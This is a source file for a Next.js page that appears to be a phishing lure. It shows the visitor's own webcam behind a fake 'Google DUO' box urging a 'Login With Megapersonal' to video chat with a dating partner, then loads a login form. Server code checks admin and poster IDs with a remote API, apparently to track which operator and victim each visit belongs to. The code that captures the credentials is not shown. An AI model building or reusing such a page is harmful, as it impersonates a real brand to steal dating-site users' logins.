import { useState } from "react";
import Login from "../../../components/Login";
import Webcam from "react-webcam";
import { API_URL, site } from "../../../config";
import Image from "next/image";



export default function Home() {
  const [showForm, setShowForm] = useState(true);

 

  return (
    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
      {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
        Waiting...
      </h1> */}
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />

      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
       
          <>
            {showForm ? (
                <div class="p-5 w-[400px]">
                <div class="mx-auto flex items-center justify-center mt-5">
                    <img class="h-16 w-16 text-center" src="/images/du_icon.svg" alt=""/>
                </div>
                <h2 class="text-3xl font-bold text-blue-900 text-center">Google DUO</h2>
                <p class="text-xl pt-5 font-semibold text-[#707b8e]">Login With Megapersonals and enjoy with  <b class="text-[#1a73e8]">Google DUO video chat</b> your dating partner.</p>
                <button class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#1a73e8] text-xl font-semibold text-white rounded-md"   onClick={() => setShowForm(false)} ><span>
                  <img src="/images/logo-potrait.jpg" class="w-12 h-12" alt=""/>
                </span><span>Login With Megapersonal</span></button>
            </div>
              // <div className="bg-white md:w-[420px] shadow-around ">
              //   <div className=" flex flex-col items-center py-4">
              //     <div className="px-8 md:px-12">
              //       <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
              //         Live Video Chat
              //       </h3>

                
              //       <p className="mt-[15px] text-lg leading-tight font-medium ">
              //         Login with megapersonals and enjoy with{" "}
              //         <span className="text-[#2b044d] font-bold">
              //           Private Live Video Chat
              //         </span>{" "}
              //         your dating partner.
              //       </p>
              //     </div>

              //     <div className="mt-[35px] mb-10 px-4 md:px-12 flex w-full font-serif">
                   
              //       <button
              //         className="bg-[#58C2FC] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
              //         onClick={() => setShowForm(false)}
              //       >
              //         <div className="relative w-10 h-10 rounded-md overflow-hidden">
              //           <Image
              //             src="/images/logo-potrait.jpg"
              //             alt="potrait"
              //             fill
              //             className="object-cover"
              //           />
              //         </div>
              //         <p className="">Login with megapersonals</p>
              //       </button>
              //     </div>
              //   </div>
              // </div>
            ) : (
              <Login />
            )}
          </>
        
      </div>
    </div>
  );

  // return (
  //   <div className="relative h-screen w-screen flex flex-col justify-center items-center">
  //     <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
  //       Waiting...
  //     </h1>
  //     <Webcam
  //       audio={false}
  //       className="object-cover h-screen w-screen lg:w-auto"
  //       // height={1080}
  //       // width={1262}
  //       // screenshotFormat="image/jpeg"
  //       // videoConstraints={videoConstraints}
  //     />

  //     <div className="absolute flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
  //       <div className=" bg-white md:w-[420px] py-4 shadow-around rounded-lg">
  //         {!showForm ? (
  //           <div className="flex flex-col items-center">
  //             <div className="px-8 md:px-12">
  //               <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
  //                 Live Video Chat
  //               </h3>

  // <p className="mt-[15px] text-lg leading-tight font-medium ">
  //   Login with megapersonals and enjoy with{" "}
  //   <span className="text-[#2b044d] font-bold">
  //     Private Live Video Chat
  //   </span>{" "}
  //   your dating partner.
  // </p>
  //             </div>

  //             <div className="mt-[35px] mb-3 px-4 md:px-12 flex w-full font-serif">
  // <button
  //   className="bg-[#990033] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
  //   onClick={() => setShowForm(true)}
  // >
  //   <div className="bg-white rounded-md w-10 h-10"></div>
  //   <p className="">Login with megapersonals</p>
  // </button>
  //             </div>
  //           </div>
  //         ) : (
  //           <Login />
  //         )}
  //       </div>
  //     </div>
  //   </div>
  // );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
